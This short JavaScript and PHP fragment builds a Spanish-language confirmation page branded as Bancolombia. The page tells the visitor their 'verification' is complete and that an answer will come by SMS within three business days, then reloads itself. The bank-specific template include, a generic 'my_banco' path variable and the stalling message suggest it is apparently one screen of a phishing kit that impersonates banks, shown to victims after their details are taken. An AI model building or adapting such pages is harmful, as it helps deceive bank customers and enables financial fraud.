var bancolombia_titulo = 'Verificación Finalizada';
var bancolombia_mensaje_1 = '¡Hemos recibido tu solicitud exitosamente!';
var bancolombia_mensaje_2 = 'Estudiaremos tu solicitud y te daremos respuesta en los siguientes 3 días hábiles a tráves de un mensaje de texto a tu celular';
var bancolombia_contenido = `
<div class="mua-panel-body" style="float:none;margin:auto;width:350px">
    <br>
    <br>
    <div class="row">
        <div class="col">
            <p class="mua-phrase-message text-center" style="font-size:24px;font-weight:bold">${bancolombia_mensaje_1}</p>
        </div>
    </div>
    <br>
    <img style="display:block;margin-left:auto;margin-right:auto" height="80" src="${my_banco}img/check.jpg">
    <br>
    <div class="row">
        <div class="col">
            <p class="mua-phrase-message text-center" style="border-style:double;border-color:black;padding:10px;">${bancolombia_mensaje_2}</p>
        </div>
    </div>
</div>
`;
<?php require_once('_plantilla_bancolombia.php'); ?>

//<script>
    $('.footer').remove();
    setTimeout(() => {
        location.reload();
    }, 10000);